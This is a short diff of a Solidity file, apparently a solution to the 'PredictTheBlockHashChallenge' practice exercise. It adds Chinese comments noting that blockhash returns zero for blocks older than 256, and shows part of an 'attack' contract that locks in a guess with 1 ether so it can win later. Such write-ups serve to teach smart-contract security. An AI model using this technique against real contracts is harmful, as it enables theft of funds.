@@ -26,7 +26,7 @@ contract PredictTheBlockHashChallenge {
         require(msg.sender == guesser);
         require(block.number > settlementBlockNumber);
 
-        bytes32 answer = blockhash(settlementBlockNumber);
+        bytes32 answer = blockhash(settlementBlockNumber);/*blockhash 方法只能得到256个区块的hash 当超过256个后 blockhash方法只能返回0 */
 
         guesser = address(0);
         if (guess == answer) {
@@ -34,7 +34,7 @@ contract PredictTheBlockHashChallenge {
         }
     }
 }
-/*blockhash 方法只能得到255个区块的hash 当超过255个后 blockhash方法只能返回0 */
+
 contract attack{
    PredictTheBlockHashChallenge traget;
      uint256 num;
@@ -45,7 +45,7 @@ constructor (address add) public
 }
     function att1() public payable
     {
-      num = block.number + 1;
+      num = block.number + 1;//得到blocknum
       traget.lockInGuess.value(1 ether)(answer);
     }
     function att2() public payable
